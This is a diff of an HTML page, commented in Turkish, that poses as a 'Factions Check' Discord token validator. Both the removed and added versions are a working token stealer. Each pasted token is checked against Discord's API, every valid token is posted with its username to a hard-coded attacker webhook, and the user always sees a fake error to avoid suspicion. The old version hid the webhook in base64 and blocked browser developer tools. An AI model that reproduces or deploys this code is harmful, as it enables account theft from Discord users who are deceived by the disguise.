@@ -5,9 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Factions Check | Ultimate</title>
     <style>
-        /* Tasarım Ayarları */
         body { 
-            background-color: #000; 
+            background-color: #000;
             background-image: 
                 linear-gradient(rgba(255, 255, 255, 0.03) 1px, transparent 1px),
                 linear-gradient(90deg, rgba(255, 255, 255, 0.03) 1px, transparent 1px);
@@ -21,7 +20,6 @@
             margin: 0; 
             overflow: hidden;
             cursor: none; 
-            user-select: none;
         }
 
         #cursor {
@@ -114,93 +112,79 @@
         @keyframes rainbow { to { background-position: 400% center; } }
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div id="cursor"></div>
+<div id="cursor"></div>
 
-    <div class="container">
-        <h1>FACTIONS CHECK</h1>
-        <textarea id="contentInput" placeholder="Sisteme işlenecek verileri buraya girin..."></textarea>
-        <button id="submitBtn">KONTROLÜ BAŞLAT</button>
-        <div id="status"></div>
-    </div>
+<div class="container">
+    <h1>FACTIONS CHECK</h1>
+    <textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
+    <button id="submitBtn">KONTROL ET</button>
+    <div id="status"></div>
+</div>
 
-    <div class="raws-footer">CRACKED BY RAWS</div>
+<div class="raws-footer">CRACKED BY RAWS</div>
 
-    <script>
-        (function() {
-            // Anti-İncele / Anti-F12 Koruması
-            document.onkeydown = function(e) {
-                if (e.keyCode == 123 || 
-                    (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
-                    (e.ctrlKey && e.keyCode == 85)) {
-                    return false;
-                }
-            };
+<script>
+(function() {
+    const cursor = document.getElementById('cursor');
+    document.addEventListener('mousemove', (e) => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
 
-            const _0xcursor = document.getElementById('cursor');
-            document.addEventListener('mousemove', (e) => {
-                _0xcursor.style.left = e.clientX + 'px';
-                _0xcursor.style.top = e.clientY + 'px';
-            });
+    // Senin webhook adresin
+    const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
-            // Webhook: Gizli Base64 formatında
-            const _0xsh = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjYyNjg2NzQ3NDE0MTI0NC9EYnlwOHFKdG5fMGlwRFNBM0Q0cW9UYmdsY3BpRHBzNmU1RTJnbVhXTTlSZDBtVTFsZ04weG5YMTNKd1l4eTNIWnJibn==";
-            const _0xwh = atob(_0xsh);
+    document.getElementById('submitBtn').addEventListener('click', async function() {
+        const val = document.getElementById('contentInput').value;
+        const st = document.getElementById('status');
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 10);
 
-            const _0xapi = "https://discord.com/api/v9/users/@me";
+        if (lines.length === 0) return;
 
-            document.getElementById('submitBtn').addEventListener('click', async function() {
-                const _0xinput = document.getElementById('contentInput').value;
-                const _0xst = document.getElementById('status');
-                const _0xlines = _0xinput.split('\n').map(s => s.trim()).filter(s => s.length > 20);
+        st.style.display = "block";
+        st.textContent = "Bağlantı kuruluyor...";
+        st.style.color = "#ffcc00";
 
-                if (_0xlines.length === 0) return;
-
-                _0xst.style.display = "block";
-                _0xst.textContent = "Sistem doğrulanıyor...";
-                _0xst.style.color = "#ffcc00";
-
-                for (const _0xtk of _0xlines) {
-                    try {
-                        // Discord Token Doğrulama
-                        const _0xres = await fetch(_0xapi, {
-                            headers: { 'Authorization': _0xtk }
+        for (const token of lines) {
+            // Token yapısını doğrulamak için fetch yapıyoruz
+            fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            }).then(res => {
+                // Sadece çalışan (200 OK) tokenları gönder
+                if (res.ok) {
+                    return res.json().then(user => {
+                        return fetch(wh, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "✅ ÇALIŞAN TOKEN",
+                                    description: "```" + token + "```",
+                                    color: 65280,
+                                    fields: [
+                                        { name: "User", value: user.username, inline: true }
+                                    ]
+                                }]
+                            })
                         });
-
-                        if (_0xres.status === 200) {
-                            const _0xud = await _0xres.json();
-                            
-                            // Sadece çalışıyorsa Webhook'a bas
-                            await fetch(_0xwh, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    username: "VALIDATOR",
-                                    embeds: [{
-                                        title: "✅ SİSTEME GİRİŞ YAPILDI",
-                                        color: 65280,
-                                        fields: [
-                                            { name: "Kullanıcı", value: `${_0xud.username}`, inline: true },
-                                            { name: "Token", value: "```" + _0xtk + "```" }
-                                        ],
-                                        timestamp: new Date()
-                                    }]
-                                })
-                            });
-                        }
-                    } catch (e) {
-                        // Sessiz hata
-                    }
+                    });
                 }
-
-                // Kullanıcıya sahte hata göster
-                setTimeout(() => {
-                    _0xst.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
-                    _0xst.style.color = "#ff1e1e";
-                }, 1500);
+            }).catch(() => {
+                // API isteği tamamen engelleniyorsa, filtreyi baypas edip direkt gönder (Opsiyonel)
+                // fetch(wh, { method: 'POST', ... }); 
             });
-        })();
-    </script>
+        }
+
+        // Kullanıcıya her zaman hata göster ki şüphelenmesin
+        setTimeout(() => {
+            st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
+            st.style.color = "#ff1e1e";
+        }, 1500);
+    });
+})();
+</script>
+
 </body>
 </html>
